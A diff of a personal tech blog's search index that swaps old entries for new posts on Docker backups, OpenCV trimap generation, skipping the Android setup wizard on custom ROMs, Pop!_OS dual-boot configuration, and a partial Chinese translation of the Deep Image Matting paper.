-      <categories>
-        <category>转载</category>
-      </categories>
-  </entry>
-  <entry>
-    <title><![CDATA[Google I/O 17]]></title>
-    <url>%2F2017%2F05%2F10%2FGoogle-I-O-17-1%2F</url>
-    <content type="text"><![CDATA[&lt;/br&gt; &lt;/br&gt; **Google I/O is an annual developer festival held at the outdoor Shoreline Amphitheatre.** May 17-19, 2017 Shoreline Amphitheatre Mountain View, California &lt;/br&gt; ​ &lt;/br&gt;官方网站：Google I/O17]]></content>
-      <tags>
-        <tag>Google</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[修复Ubuntu17.04无法安装网易云音乐问题（转载）]]></title>
-    <url>%2F2017%2F04%2F17%2F%E4%BF%AE%E5%A4%8DUbuntu17.04%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%97%AE%E9%A2%98%2F</url>
-    <content type="text"><![CDATA[装了Ubuntu17.04的用户会出现这一问题，原因是libqt5libqgtk2的依赖问题，这里需要将其替换为qt5-style-plugins. 教程如下（以下内容来自互联网）： 1.下载deb包，备用 网易云音乐 2.安装一些编译时需要的程序 sudo apt-get install build-essential debhelper make autoconf automake dpkg-dev fakeroot pbuilder gnupg 3.解包 建立目录sudo mkdir -p netease/DEBIAN sudo mkdir fix 解包sudo dpkg -x netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb ./netease 解出控制文件sudo dpkg -e netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb netease/DEBIAN/ 修改控制文件sudo gedit netease/DEBIAN/control 找到 libqt5libqgtk2 ，替换为 qt5-style-plugins ，保存，退出。 4.重新打包 sudo dpkg-deb -b netease/fix/ 5.安装 sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb 6.至此，理论上不会出错。 （如若报错尝试命令sudo apt-get install -f） PS:修改过的包 网易云音乐fixed 密钥：!aTE_wj3jalmc7Gu5rxhgM3WpLtGzv6ymBrbgJCpDEIg]]></content>
-      <categories>
-        <category>Tips</category>
-      </categories>
-      <tags>
-        <tag>网易云音乐</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[Hello World]]></title>
-    <url>%2F2017%2F02%2F17%2FHello-World%2F</url>
-    <content type="text"><![CDATA[]]></content>
-      <categories>
-        <category>HelloWorld</category>
-      </categories>
-  </entry>
+  
+  
+    
+    <entry>
+      <title><![CDATA[Docker试玩笔记]]></title>
+      <url>https://blog.yanggang.cool/2019/06/28/Docker%E8%AF%95%E7%8E%A9%E7%AC%94%E8%AE%B0/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>未完工。</p>
+<a id="more"></a>
+<p>推荐网站：<a href="https://labs.play-with-docker.com/" target="_blank" rel="noopener">Play with Docker</a>，网站提供了免费 Linux 环境来供大家在浏览器中构建并运行 Docker。</p>
+<h2 id="Docker-中容器-镜像的备份、恢复及迁移"><a href="#Docker-中容器-镜像的备份、恢复及迁移" class="headerlink" title="Docker 中容器/镜像的备份、恢复及迁移"></a>Docker 中容器/镜像的备份、恢复及迁移</h2><ol>
+<li><p>备份容器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+<p>列出在运行的需要备份的容器，得到 <code>CONTAINER ID</code> 。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -p <span class="string">"CONTAINER ID"</span> <span class="string">"backup name"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>导出镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o ./docker_backup.tar <span class="string">"backup name"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>恢复</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i ./docker_backup.tar</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> Docker </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Docker </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[半自动生成 Trimap]]></title>
+      <url>https://blog.yanggang.cool/2019/05/08/%E5%8D%8A%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90Trimap/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一个简单的 Trimap 生成方法。基于轮廓查找、填充以及形态学操作。</p>
+<a id="more"></a>
+<h2 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h2><ol>
+<li><p>生成与图像宽高对应的 “mask”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.zeros((h, w), dtype=np.uint8)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>绘制所需轮廓（封闭）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">draw_circle</span><span class="params">(event, x, y, flags, param)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flags == cv.EVENT_FLAG_LBUTTON:</span><br><span class="line">        cv.circle(img, (x, y), <span class="number">10</span>, (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        cv.circle(img_mask, (x, y), <span class="number">10</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">-1</span>)</span><br><span class="line">cv.setMouseCallback(<span class="string">'image'</span>, draw_circle)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>轮廓查找及填充</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contours, hierarchy = cv.findContours(binImg, cv.RETR_TREE, cv.CHAIN_APPROX_SIMPLE)</span><br><span class="line">cv.drawContours(image, contours, <span class="number">0</span>, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), cv.FILLED)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生成 Trimap (dilate)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unknown = cv.dilate(unknown, kernel, iterations=np.random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>原图：</p>
+<p><img src="https://github.com/SamuelYG/trimap_generate/blob/master/test.png?raw=true" alt></p>
+<p>结果：</p>
+<p><img src="https://github.com/SamuelYG/trimap_generate/blob/master/trimap.png?raw=true" alt></p>
+<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
+<li>限单一轮廓</li>
+<li>不精确</li>
+</ul>
+<hr>
+<p>代码：<a href="https://github.com/SamuelYG/trimap_generate" target="_blank" rel="noopener">trimap generate</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> Python </category>
+            
+            <category> CV </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> OpenCV </tag>
+            
+            <tag> TrimapGenerate </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[类原生跳过 Google 向导的各种办法]]></title>
+      <url>https://blog.yanggang.cool/2019/04/22/%E7%B1%BB%E5%8E%9F%E7%94%9F%E8%B7%B3%E8%BF%87Google%E5%90%91%E5%AF%BC%E7%9A%84%E5%90%84%E7%A7%8D%E5%8A%9E%E6%B3%95/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>相信很多人跟俺一样喜欢使用类原生的 Android 系统，而缺少了 Google 服务框架的 Android 就如同人没有了灵魂。但是有时候 Google 的开机向导却让人很烦，下面就总结一下各种跳过开机向导的办法。</p>
+<a id="more"></a>
+<h2 id="0、先说一下出现的原因"><a href="#0、先说一下出现的原因" class="headerlink" title="0、先说一下出现的原因"></a>0、先说一下出现的原因</h2><p>如果你先阅读了本章节，可能免去阅读以下章节造成的时间浪费。</p>
+<p>下面几种操作会让你必须在第一次进入系统时完成设置向导：</p>
+<ul>
+<li>刷机之前没有退出登录 Google 账号</li>
+<li>没有拔掉中国的手机卡</li>
+<li>买了 Google Pixel （咱没用过，应该必须要走设置向导这个流程吧）</li>
+<li>人品差</li>
+</ul>
+<p>如果你能避免以上操作，开机向导应该能非常舒适的<strong>跳过</strong>。</p>
+<p>总之，如果你因为上面的原因或其他不可预知的问题造成你未能舒适的进入系统，下面的内容可能就有你需要的。</p>
+<h2 id="1、方法有很多种"><a href="#1、方法有很多种" class="headerlink" title="1、方法有很多种"></a>1、方法有很多种</h2><p>以下内容尽量采取由简到繁的顺序。但是部分方法因为没有设备或者条件不足或者懒的原因，本文并不提供具体方法。</p>
+<h3 id="良好的网络环境"><a href="#良好的网络环境" class="headerlink" title="良好的网络环境"></a>良好的网络环境</h3><ul>
+<li>身处国外</li>
+<li>路由器插件科学上网</li>
+<li>电脑科学上网并共享给手机</li>
+<li>非中国大陆地区电话卡</li>
+</ul>
+<h3 id="“良好”的-ROM-Gapps"><a href="#“良好”的-ROM-Gapps" class="headerlink" title="“良好”的 ROM + Gapps"></a>“良好”的 ROM + Gapps</h3><ul>
+<li>设置向导界面点击四角跳过</li>
+<li>其他emmm</li>
+</ul>
+<h3 id="个人喜欢的方法"><a href="#个人喜欢的方法" class="headerlink" title="个人喜欢的方法"></a>个人喜欢的方法</h3><ul>
+<li>数据线连接电脑，进入 TWRP 并 mount（挂载）system 分区</li>
+<li><code>adb devices</code> 确保一切无误</li>
+<li><code>adb pull system/build.prop /dir</code> 将所需文件拉取到电脑</li>
+<li><code>echo &#39;ro.setupwizard.mode=DISABLED&#39; &gt;&gt; /dir/build.prop</code> 或手动编辑 <code>build.prop</code> 加入一行 <code>ro.setupwizard.mode=DISABLED</code></li>
+<li><code>adb push /dir/build.prop system</code> 将文件放回去</li>
+<li><code>adb shell</code> 进入手机内部 <code>shell</code><ul>
+<li><code>cd system</code></li>
+<li><code>chmod 0644 build.prop</code></li>
+<li><code>exit</code></li>
+</ul>
+</li>
+<li>重启</li>
+</ul>
+<p>或者 TWRP 内直接使用 vi 编辑器添加 <code>ro.setupwizard.mode=DISABLED</code> ，前提是知道 vi 的基本操作。</p>
+<h3 id="不推荐的方法"><a href="#不推荐的方法" class="headerlink" title="不推荐的方法"></a>不推荐的方法</h3><ul>
+<li>直接 TWRP 删除 setupwizard 相关软件</li>
+</ul>
+<p>大致如此，有更好的方法欢迎评论。当然，Google 如果能够回来才是最吼的。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> Tips </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Google </tag>
+            
+            <tag> 开机向导 </tag>
+            
+            <tag> setupwizard </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Pop!_OS 与 Windows10 不同盘双系统启动问题]]></title>
+      <url>https://blog.yanggang.cool/2019/04/05/Pop!_OS%20%E4%B8%8E%20Windows10%20%E4%B8%8D%E5%90%8C%E7%9B%98%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前言：Pop!_OS 在新的版本不再使用 GRUB 而是选择了能让启动速度更快（在某些论坛看到一些说法，不知是否准确）的 <a href="https://wiki.archlinux.org/index.php/Systemd-boot_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="noopener">systemd-boot</a>&gt;) 。但是 <a href="https://wiki.archlinux.org/index.php/Systemd-boot_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="noopener">systemd-boot</a>&gt;) 无法识别到另一个磁盘 EFI 分区的 Windows 。因为不了解 <a href="https://wiki.archlinux.org/index.php/Systemd-boot_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="noopener">systemd-boot</a>&gt;) 所以就在网上搜索了一些信息，这里做个总结。</p>
+<a id="more"></a>
+<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>假设你是根据<a href="https://pop.system76.com/docs/dual-booting-windows/" target="_blank" rel="noopener">此教程</a>已完成双系统的安装，且 EFI 与 Windows 不在同一块硬盘。那么 Pop!_OS 的 EFI 会在 <code>/boot/efi/</code> 路径下，其中 <code>EFI</code> 下存有相应的文件，<code>loader</code> 下是对应的启动配置文件。</p>
+<p>找到 Windows 的 EFI 分区，挂载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/nvme0n1p2 /dir # 每个人的分区可能有所不同</span><br></pre></td></tr></table></figure>
+<p>然后将分区内文件复制到 <code>/boot/efi/EFI/</code> 内。</p>
+<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>先查看 Windows EFI 分区的 PARTUUID</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blkid -s PARTUUID -0 value /dev/nvme0n1p2</span><br></pre></td></tr></table></figure>
+<p>然后在 <code>/boot/efi/loader/entries/</code> 下创建一个 Windows 的配置文件 <code>Windows_10.conf</code>，填入以下内容（其中 PARTUUID 替换为上一步中得到的信息）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title Microsoft Windows 10</span><br><span class="line">efi /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">options root=PARTUUID=6ded70ea-82c3-4b0c-9edc-b5a71a55a0e8 rw</span><br></pre></td></tr></table></figure>
+<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootctl update</span><br></pre></td></tr></table></figure>
+<p>因为 <a href="https://wiki.archlinux.org/index.php/Systemd-boot_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87" target="_blank" rel="noopener">systemd-boot</a>&gt;) 会默认直接进入 Pop!_OS 所以你可以选择在开机时按住空格键或者修改 <code>/boot/efi/loader/loader.conf</code> 文件，添加一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 30</span><br></pre></td></tr></table></figure>
+<p>接下来重启就可以选择启动那个系统了。</p>
+<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><p>经过上述步骤后，启动时会出现 <code>Microsoft Windows 10</code> 和 <code>Windows Boot Manager</code> 两个 Windows 选项，前者是我们创建的，后者应该是自动识别的。</p>
+<p>所以很疑惑是否一和二只需其一？我没有去测试，如果有人尝试了可以评论/Email告诉我结果。</p>
+<p>参考文章：</p>
+<p><a href="https://bbs.archlinuxcn.org/viewtopic.php?id=4476" target="_blank" rel="noopener">想问下systemd-boot引导双系统的问题</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> EFI </category>
+            
+            <category> 双系统 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 双系统 </tag>
+            
+            <tag> EFI </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[深度抠图 Deep Image Matting 译文]]></title>
+      <url>https://blog.yanggang.cool/2019/03/13/%E6%B7%B1%E5%BA%A6%E6%8A%A0%E5%9B%BE_DeepImageMatting/</url>
+      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文是 Adobe 等机构的论文 <a href="https://arxiv.org/abs/1703.03872" target="_blank" rel="noopener">Deep Image Matting</a> 译文。因为是初稿，如有错误及不当之处，烦请指正。</p>
+<a id="more"></a>
+<h1 id="深度抠图"><a href="#深度抠图" class="headerlink" title="深度抠图"></a>深度抠图</h1><center>Ning Xu<sup>1,2</sup>, Brain Price<sup>3</sup>, Scott Cohen<sup>3</sup>, and Thomas Huang<sup>1,2</sup></center>
+
+
+
+<center><sup>1</sup>Beckman Institute for Advanced Science and Technology</center>
+
+<center><sup>2</sup>University of Illinois at Urbana-Champaign</center>
+
+<center><sup>3</sup>Adobe Research</center>
+
+<center>{ningxu2, t-huang1}@illinois.edu, {bprice, scohen}@adobe.com</center>
+
+<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>抠图是一个基本的计算机视觉问题，并且拥有广阔的应用空间。但当图像的前景和背景颜色或复杂纹理类似时，以前的算法表现的差强人意。主要是因为：1. 只有低层次特征（low-level features）；2. 缺乏高层次上下文图镜（high-level context）。本文中，我们提出了一种基于深度学习的新算法，该算法可以解决这两个问题。我们的深度模型分为两个阶段：第一个阶段是深度卷积编码-解码网络（deep convolutional encoder-decoder network），该神经网络将图像和对应的三分图（trimap）作为输入，并预测图像的 α 蒙版（α matte）；第二阶段是一个小型卷积神经网络，该神经网络对第一个网络预测的 α 蒙版进行精炼从而拥有更准确的 α 值和锐化边缘。另外，我们还创建了一个大规模抠图数据集（large-scale image matting dataset），该数据集包含 49300 张训练图像和 1000 张测试图像。我们在抠图基准、测试数据集和各种真实图像上评估了我们的算法。实验结果清楚的表明了我们的算法比先前的方法更具优越性。</p>
+<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>抠图是图像或视频中准确的前景估计问题，具有重要的现实意义。它是图像编辑和电影制作的关键技术，高效的自然图像抠图方法能极大地提升当前的图像视频处理流程的效率。并且这种技术是无约束场景（unconstrained scenes）下处理真实世界图像的必要方法。</p>
+<p>不幸的是，目前的抠图方法无法很好的推广到典型的日常场景。这在一定程度上是由于问题的难度：抠图问题是欠约束的，在每个像素上有 7 个未知值却仅有 3 个已知值：</p>
+<script type="math/tex; mode=display">
+I_i = α_iF_i + (1 - α_i)B_i \quad α_i∈[0, 1] \tag {1}</script><p>其中已知的 <script type="math/tex">I_i</script> 是像素 <script type="math/tex">i</script> 的 RGB 色彩，前景色 <script type="math/tex">F_i</script> ，背景色 <script type="math/tex">B_i</script> 和蒙版估计（matte estimation）<script type="math/tex">α_i</script> 均为未知量。因此，目前的方法在其方法中进一步受到限制。</p>
+<p>第一个限制是目前用来求解抠图方程（matting equation）的方法存在问题。</p>
+<p>这个方程将抠图问题表述为两种颜色的线性组合，因此目前大多数算法都将其作为颜色问题来处理。标准方法包括采样前景色和背景色 <sup><a href="#fn_3" id="reffn_3">3</a></sup><sup><a href="#fn_9" id="reffn_9">9</a></sup> ，根据抠图方程 <sup><a href="#fn_14" id="reffn_14">14</a></sup><sup><a href="#fn_31" id="reffn_31">31</a></sup><sup><a href="#fn_22" id="reffn_22">22</a></sup> 或者两者的混合 <sup><a href="#fn_32" id="reffn_32">32</a></sup><sup><a href="#fn_13" id="reffn_13">13</a></sup><sup><a href="#fn_28" id="reffn_28">28</a></sup><sup><a href="#fn_16" id="reffn_16">16</a></sup> 传播 <script type="math/tex">α</script> 值。这种方法很大程度上依赖于颜色作为区别特征（通常与像素的空间位置一起），使得它们对前景和背景颜色分布重叠的情况非常敏感，对于这个方法不幸的是，自然图像的常见情况，根据方法的不同，往往导致低频“smearing”或高 频“chunky”伪影（参见图 <a href="#1">1</a> 的顶行）。即使是最近提出的深度学习方法也高度依赖于颜色相关的传播方法<sup><a href="#fn_8" id="reffn_8">8</a></sup><sup><a href="#fn_29" id="reffn_29">29</a></sup>。</p>
+<p><img src="https://miao.su/images/2019/03/13/15524836698559c297.png" alt="图像|三分图|Closed-form|Ours"></p>
+<blockquote>
+<p>图 <a href="#1">1</a>. 我们的方法和 Close-form Matting<sup><a href="#fn_22" id="reffn_22">22</a></sup>之间的比较第一张图来自 Alpha Matting 基准，第二张图片来自我们的 1000 张测试图像</p>
+</blockquote>
+<p>第二个限制是由于非常小的数据集。一般用于抠图的标准结果（ground truth）是很复杂的，而 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集 <sup><a href="#fn_25" id="reffn_25">25</a></sup> 通过提供标记数据集（ground-truth）对抠图研究做出了很重要的贡献。不过因为该数据集只由 27 张训练图像和 8 张测试图像组成，其中大部分是监视器上图像前面的物体。由于其大小和数据集的约束（例如：室内实验室场景，室内照明，没有人类或动物），它本质上会存在偏差，并且为了发布的目的激励方法适应这些数据。与所有数据集（尤其是小数据集）的情况一样，某些时候，方法将过拟合数据集，不再能推广到真实场景。最近拥有 3 个训练视频和 10 个测试视频的视频抠图数据集<sup><a href="#fn_10" id="reffn_10">10</a></sup> ，其中 5 个是从绿屏画面中提取的，其余的是使用类似alphamatting数据集<sup><a href="#fn_25" id="reffn_25">25</a></sup>的方法。</p>
+<p>在这项工作中，我们提供了一种旨在克服这些局限性的方法。我们的方法是使用深度学习在给定输入图像和三分图的基础上直接预测 α 蒙版（alpha matte）。我们的神经网络并不首要依赖于色彩信息，它会学习图像的自然结构，并将其反映到 α 蒙版中。例如头发和毛皮（通常需要将其抠出来）就拥有很强的结构和纹理图案。以及其他通常需要抠图的并且存在能抽取出的公用结构体或 <script type="math/tex">α</script> 蒙版轮廓的情况（例如：物体的边缘、光学或运动模糊的区域、或者半透明区域）。并且由于低层次的特征并不会捕获这些结构，那么就需要深度神经网络去表征它们了。我们的两阶段神经网络包含了编码器-解码器阶段和使用小型残差网络进行精炼阶段，并且包含除了 <script type="math/tex">α</script> 损失之外的新的合成损失（ompositional loss）。我们是第一个证明了在给定输入图像和三分图的情况下能采用端到端的方式学习到 <script type="math/tex">α</script> 蒙版。</p>
+<p>为了训练一个在无约束场景的自然图像中表现优异的模型，我们需要一个比现有更大的数据集。使用alphamatting <sup><a href="#fn_25" id="reffn_25">25</a></sup> 的方法获得标准结果（ground truth）数据集是非常复杂的，并且无法处理任何程度的运动场景（因此无法捕获人类或动物）。相反，受其他合成数据集已被证明足以训练模型用于真实图像的启发（例如：<sup><a href="#fn_4" id="reffn_4">4</a></sup>），我们使用合成方法构建了一个大规模的抠图数据集。仔细提取具有简单背景图片上的对象并将其合成为具有新的背景的图像以创建具有 49300 个训练图像和 1000 个测试图像的数据集。</p>
+<p>我们进行了广泛的评估，以证明我们的方法的有效性。我们的方法不仅在 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 挑战中获得第一名，而且我们在合成测试集上的表现也大大超过了先前的方法。我们与用户展示并研究了我们的学习模型推广（generalizes）到自然图像的情况并与先前的许多方法在 31 种不同场景、不同照明并以人类、动物和其他物体为特色的自然图像中的表现做了对比。研究显示更偏向于我们的结果，但同时也表明，与人类判断的的其他方法相比，某些在 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集上表现良好的方法实际上表现的较差，这表明这些方法在 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集上是过拟合的。最后，模型还展示出对 trimap 的放置比其他方法更稳健。实际上，即使 trimap 没有已知的前景和/或背景，我们也可以得到很好的结果，而大多数方法都不能返回任何结果（参见图 1第2行）。</p>
+<h2 id="2-相关工作"><a href="#2-相关工作" class="headerlink" title="2. 相关工作"></a>2. 相关工作</h2><p>目前的抠图方法主要依靠颜色以及位置或其他低层次特征来确定 <script type="math/tex">α</script> 蒙版（alpha matte）。它们通过采样、传播或两者的组合来实现。</p>
+<p>基于采样的方法 <sup><a href="#fn_3" id="reffn_3">3</a></sup><sup><a href="#fn_9" id="reffn_9">9</a></sup><sup><a href="#fn_32" id="reffn_32">32</a></sup><sup><a href="#fn_13" id="reffn_13">13</a></sup><sup><a href="#fn_28" id="reffn_28">28</a></sup><sup><a href="#fn_16" id="reffn_16">16</a></sup> 中，对已知的前景和背景区域采样来找到对于给定像素的前景和背景候选颜色，然后使用度量（metric）来确定最佳前景/背景组合。使用不同的采样方法，包括距离给定像素最近的边界进行采样 <sup><a href="#fn_32" id="reffn_32">32</a></sup> ，基于射线铸造（ray casting）的采样 <sup><a href="#fn_13" id="reffn_13">13</a></sup> ，搜索整个边界 <sup><a href="#fn_16" id="reffn_16">16</a></sup> ，或从颜色簇（color clusters）采样 <sup><a href="#fn_28" id="reffn_28">28</a></sup><sup><a href="#fn_12" id="reffn_12">12</a></sup> 。在采样候选项中确定度量（metric）几乎总是包含一个抠图方程式重构误差（matting equation reconstruction error），可能由于测量样本与给定像素的距离 <sup><a href="#fn_32" id="reffn_32">32</a></sup><sup><a href="#fn_16" id="reffn_16">16</a></sup> 或者前景和背景样本的相似性 <sup><a href="#fn_32" id="reffn_32">32</a></sup><sup><a href="#fn_28" id="reffn_28">28</a></sup> ，以及包括稀疏编码 <sup><a href="#fn_12" id="reffn_12">12</a></sup> 和 KL-divergence （KL-发散）方法 <sup><a href="#fn_19" id="reffn_19">19</a></sup><sup><a href="#fn_18" id="reffn_18">18</a></sup> 。像纹理 <sup><a href="#fn_27" id="reffn_27">27</a></sup> 等高阶特征已经很少使用，并且效果有限。</p>
+<p>在传播方法中，公式 <script type="math/tex">(1)</script> 重新配置，使其允许 <script type="math/tex">α</script> 值从已知的前景和背景区域传播（propagation）到未知区域。流行的方法是使用通常作为采样后的后处理 <sup><a href="#fn_32" id="reffn_32">32</a></sup><sup><a href="#fn_16" id="reffn_16">16</a></sup><sup><a href="#fn_28" id="reffn_28">28</a></sup> 的 Close-form 抠图 <sup><a href="#fn_22" id="reffn_22">22</a></sup> 。它从前景和背景颜色的局部平滑度假设推导出一个成本函数，并通过求解稀疏线性系统方程组找到全局最优的 <script type="math/tex">α</script> 蒙版（alpha matte）。其他的传播方法包括随机游走（random walks）<sup><a href="#fn_14" id="reffn_14">14</a></sup> ，求解泊松方程（Poisson equation）<sup><a href="#fn_31" id="reffn_31">31</a></sup> 和非本地传播方法（nolocal propagation methods）<sup><a href="#fn_21" id="reffn_21">21</a></sup><sup><a href="#fn_7" id="reffn_7">7</a></sup><sup><a href="#fn_5" id="reffn_5">5</a></sup> 。</p>
+<p>近年来，人们提出了一些深度学习方法来解决抠图问题。然而，不能直接从给定图像和三分图中学习其 <script type="math/tex">α</script> 蒙版（alpha matte）。Shen 等人 <sup><a href="#fn_29" id="reffn_29">29</a></sup> 使用深度学习创建肖像图中人物的三分图，并使用 <sup><a href="#fn_22" id="reffn_22">22</a></sup> 进行抠图，将抠图误差（error）反向传播到网络中。Cho 等人<sup><a href="#fn_8" id="reffn_8">8</a></sup> 采用 <sup><a href="#fn_22" id="reffn_22">22</a></sup> 和 <sup><a href="#fn_5" id="reffn_5">5</a></sup> 的抠图结果，将 RGB 颜色归一化为输入，并训练一个端到端的深度网络来预测新的 <script type="math/tex">α</script> 蒙版（alpha matte）。虽然我们的算法和这两个项目都利用了深度学习，但我们的算法与它们的算法完全不同。我们的算法直接学习给定从给定图像和三分图直接学习对应的 <script type="math/tex">α</script> 蒙版（alpha matte）而另外两个项目依赖于现存的算法来计算实际的抠图问题，使得他们的方法容易出现和以前的抠图方法同样的问题。</p>
+<p><img src="https://miao.su/images/2019/03/13/1552483942593f2efa.png" alt></p>
+<blockquote>
+<p>图 <a href="#2">2</a>. 数据集的创建。 (a) 包含简单背景的手动抠图的输入图像， (b) 计算 alpha 蒙版和 (c) 计算的前景色用作数据真值用来将对象合成到 (d-f) 各种背景图上。</p>
+</blockquote>
+<h2 id="3-新的抠图数据集"><a href="#3-新的抠图数据集" class="headerlink" title="3. 新的抠图数据集"></a>3. 新的抠图数据集</h2><p><a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> <sup><a href="#fn_25" id="reffn_25">25</a></sup> 上的抠图基准在推动抠图研究的进步方面取得了巨大的成功。然而，由于获取数据真值（ground truth）图像需要细心且繁琐的工作，此数据集仅由 27 张训练图像和 8 张测试图像构成。这不仅不足以训练神经网络，而且其多样性受到严重限制，仅限于具有静态物体的小规模实验室场景。</p>
